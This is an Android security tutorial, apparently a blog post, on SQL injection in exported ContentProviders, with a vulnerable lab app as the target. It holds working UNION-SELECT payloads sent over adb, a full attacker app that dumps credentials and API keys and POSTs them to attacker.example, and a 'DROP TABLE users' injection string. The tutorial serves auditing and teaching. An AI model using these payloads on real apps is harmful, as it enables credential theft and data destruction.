ContentProviders that back onto SQLite and accept caller-supplied `selection` / `selectionArgs` / `sortOrder` parameters without parameterization are vulnerable to classic SQL injection. The attack surface is narrower than a web SQLi, you usually only get UNION-style data exfiltration through the cursor, but on an exported provider, any installed app can issue queries that read tables they were never meant to see.

  </ul>
</aside>

<br>**The shape**

This is `VulnContentProvider`'s `query()` method - the method every `ContentResolver.query()` call from any app on the device eventually lands in, once the provider is reachable. Four things in it are worth stopping on, marked **1** through **4** below:

<img alt="Annotated VulnContentProvider.query() showing four SQL-injection points" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-query-annotated.png">

**Highlight 1** is where the table name comes from. `uri.getLastPathSegment()` takes whatever's at the end of the `content://` URI - the `/users` in `content://com.vulnlab.app.provider/users` - and uses it as-is as the table name. Convenient: one `query()` serves every table, `/users` hits `users`, `/sessions` hits `sessions`, no per-table switch needed. But the `if (table == null) table = "users"` line is a default, not a check - it never verifies the table name is one the provider intended to expose.

**Highlight 2** is the actual injection point. `selection` is the raw string the caller passed in - as `--where` over adb, or the `selection` parameter of `ContentResolver.query()`. It's string-concatenated straight after `" WHERE "`, no parameterization. Same mistake as building SQL with `+` in a servlet, just relocated to Android IPC - and the source even leaves itself a note about it: `// VULN: raw attacker string in SQL`.

**Highlight 3** is where 1 and 2 combine. `"SELECT * FROM " + table + where` glues an attacker-influenced table name and an attacker-controlled WHERE clause onto a fixed `SELECT *`. Three untrusted-adjacent pieces, one concatenated string, nothing bound.

**Highlight 4** is what actually makes it exploitable. `db.rawQuery(query, null)` runs that string as SQL and passes `null` for the bind arguments. That `null` is the tell: with `selectionArgs` used correctly, SQLite would bind the untrusted values safely regardless of content. With `null`, every character of `selection` is parsed as SQL syntax instead. That's the whole bug in one argument.

Three injectable parameters fall out of this:

**Selection** (highlight 2), concatenated into the WHERE clause. Standard SQLi.

**Table name** (highlight 1), taken from the URI path with no allowlist. Attacker reads tables never meant to be exposed through this authority (`users`, `sessions`).

**Projection**, not exploitable here because `rawQuery` ignores the `projection` parameter entirely - but worth checking on every other provider you audit, because a variant that passes `projection` straight into `db.query()` will accept a subquery in place of a column name: `(SELECT password FROM users WHERE id=1)`.

None of that matters if the provider isn't reachable, so the other half of "the shape" is `AndroidManifest.xml` - same as any provider bug, it's where you get the `authority` and the reachability. Three attributes on this declaration decide whether the injectable code above is reachable at all:

<img alt="Annotated VulnContentProvider manifest declaration showing three reachability attributes" loading="lazy" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-manifest-annotated.png">

**Highlight 1**, `android:authorities`, is the host of every `content://` URI you'll query - `content://com.vulnlab.app.provider/...`. `android:name` maps that authority to the class to open next, `VulnContentProvider`.

**Highlight 2**, `android:exported="true"` with no `android:readPermission`, is what makes any of this reachable - every installed app can call `ContentResolver.query()` against this authority. Flip it to `false`, or gate it behind a `signature` permission, and the injection is still a bug but no longer one a third-party app can trigger.

**Highlight 3**, `android:grantUriPermissions="true"`, isn't directly related to the SQL injection, but worth noting - it lets this provider hand out temporary URI grants, which matters when chaining with other primitives (the path-traversal `openFile()` bug in this same class, for one).

With the authority and class name in hand, grep the decompile for that class's `query` implementation:

```bash
grep -rn '@Override.*public Cursor query' decompile/
```

For each, check:

```java
db.query(table, projection, selection, selectionArgs, ...);   // mostly safe if selectionArgs used
db.rawQuery(sql, args);                                       // potentially dangerous depending on sql
db.execSQL(stmt);                                             // dangerous
sqlBuilder.appendWhere(...);                                  // dangerous if input is concatenated
```

The vulnerability is when the parameters that go into the WHERE clause (or projection, or table name) are concatenated from attacker input rather than passed as `selectionArgs` (which SQLite binds safely).

Runtime hook on the vulnerable class directly:

```javascript
Java.perform(function () {
  const VP = Java.use('com.vulnlab.app.providers.VulnContentProvider');
  VP.query.implementation = function (uri, proj, sel, selArgs, sort) {
    console.log('[VulnContentProvider.query] uri=' + uri + ' selection=' + sel);
    return this.query(uri, proj, sel, selArgs, sort);
  };
});
```

Fire the probes below via `adb` and watch what concatenated SQL the provider actually builds (also visible in logcat under tag `VulnProvider`).

<br>**Confirming it, and shaping the query**

Before writing any exploit, three things have to be answered: is the `selection` actually evaluated as SQL, how many columns does the base query return, and what tables and columns exist. Black-box you derive each in turn; with the lab source you read them straight off the `CREATE TABLE` and skip ahead.

One quoting gotcha first: `adb shell` hands the command to a *second* shell on the device, which re-splits on spaces. A multi-word `--where` like `1=0 UNION SELECT 1` arrives as separate tokens and `content` rejects `UNION` as an unknown argument. Wrap the clause in single quotes *inside* the double quotes so the device shell keeps it as one token. (Those single quotes are the shell's, not SQL's - fine while the payload contains no `'`; when it does, run the query from the attacker app instead, where no second shell mangles it.)

**Is it injectable.** A boolean pair - the row count flips only if your string is parsed as SQL, not bound (`1=1` / `1=2` are single tokens, so they need no extra quoting):

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "1=1"   # all rows

adb shell content query --uri content://com.vulnlab.app.provider/users --where "1=2"   # none
```

A dangling keyword forces a syntax error - proof the clause is concatenated into a parsed statement, not bound as a literal:

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=1 AND'"   # SQLiteException in logcat
```

**How many columns.** The provider runs `SELECT * FROM users`, so a `UNION` has to supply the *same* column count. Walk it up until the syntax error clears:

```bash
adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=0 UNION SELECT 1'"

adb shell content query --uri content://com.vulnlab.app.provider/users --where "'1=0 UNION SELECT 1,2,3,4,5'"   # clears → 5 columns
```

`1=0` keeps the base rows out so only the injected row returns. `ORDER BY 6` works too - it errors while the ordinal exceeds the column count.

**What tables and columns.** With the count known, pull the schema from `sqlite_master` - `name` is the table, `sql` is its full `CREATE TABLE`:

```bash
adb shell content query \
    --uri content://com.vulnlab.app.provider/users \
    --where "'1=0 UNION SELECT name,sql,3,4,5 FROM sqlite_master'"
```

<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/content-provider-sql-2.png">

That hands you every table, every column, every constraint - which is where `users(id, email, password, role, api_key)` comes from. The exploit query just fills the five slots with the columns worth stealing:

```
1=1 UNION SELECT id, email, password, role, api_key FROM users
```

So the attacker app's hardcoded `UNION` below isn't a guess - it's the output of these three steps.

<br>**Attacker app**

The attacker app does three things. It builds the `content://` URI for the target table. It calls `getContentResolver().query(...)` with a malicious `selection` - `1=1 UNION SELECT ...` - which the provider concatenates straight into its `SELECT`, so the cursor comes back carrying whatever columns the injected query named. It walks that cursor and ships the rows to a server the attacker controls, on a background thread so the query doesn't block the UI:

```java
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Uri uri = Uri.parse("content://com.vulnlab.app.provider/users");

        // injected UNION pulls admin creds + API keys from the same table
        Cursor c = getContentResolver().query(
            uri,
            null,
            "1=1 UNION SELECT id, email, password, role, api_key FROM users",
            null,
            null);

        StringBuilder out = new StringBuilder();
        if (c != null) {
            while (c.moveToNext()) {
                out.append(c.getString(1)).append('|')      // email
                   .append(c.getString(2)).append('|')      // password
                   .append(c.getString(4)).append('\n');    // api_key
            }
            c.close();
        }

        new Thread(() -> {                           // exfiltrate off the main thread
            try {
                new OkHttpClient().newCall(new Request.Builder()
                    .url("https://attacker.example/")
                    .post(RequestBody.create(out.toString().getBytes()))
                    .build()).execute();
            } catch (IOException ignored) {}
        }).start();
    }
}
```

The injected `UNION SELECT` returns admin credentials and API keys from the same table, and the attacker POSTs them out with no prompt and nothing on screen. Variant: read tables the provider was never meant to expose by changing the URI path segment (e.g. `/sessions`).

The same dump straight from `adb`, no attacker app needed:

```bash
adb shell content query \
    --uri content://com.vulnlab.app.provider/users \
    --where "'1=1 UNION SELECT id, email, password, role, api_key FROM users'"
```

<br>**The "but selectionArgs is safe" objection**

True if used. Many apps build the selection string by concatenation but then pass an empty `selectionArgs`. The `selectionArgs` parameter exists, it is just unused. The concatenated `selection` is the injection point.

A second variant, seen on other providers in the wild rather than this one: the developer passes `selectionArgs` correctly for some query paths and not others, e.g. a provider with a `switch` on URI path that routes to several table-specific queries, one of which was written by someone who didn't get the memo. The audit step is reading every branch, not just the first one you find.

<br>**The execSQL escalation, write primitive**

`VulnContentProvider`'s own `update()`/`insert()`/`delete()` are no-op stubs (`return 0` / `null`) — there's no write primitive in this lab app. But it's common enough in the wild to be worth knowing the shape. If a provider exposes `update`, `insert`, or `delete` via concatenated SQL instead of stubbing them out, you get a write primitive:

```java
// Hypothetical — not present in VulnContentProvider
@Override
public int update(Uri uri, ContentValues values, String selection, String[] selectionArgs) {
    String sql = "UPDATE users SET name = '" + values.getAsString("name") +
                 "' WHERE id = " + uri.getLastPathSegment();
    db.execSQL(sql);
    return 1;
}
```

The URI segment is concatenated into the WHERE. Attacker passes `1; DROP TABLE users; --` as the path segment. The `execSQL` runs both statements (on some SQLite configurations, depends on whether multi-statement is enabled).

Even without multi-statement, the attacker can update arbitrary rows by injecting into the WHERE: `id = 1 OR 1=1` updates every row.


<br>**Closing**

ContentProvider SQL injection is the classic web bug translated to IPC. The grep is on `SQLiteDatabase.query` / `rawQuery` / `execSQL` calls inside provider classes. The exploit is the standard UNION-SELECT one. Always check whether `selectionArgs` is actually used or just passed empty alongside a concatenated `selection`.

Happy Hacking !!
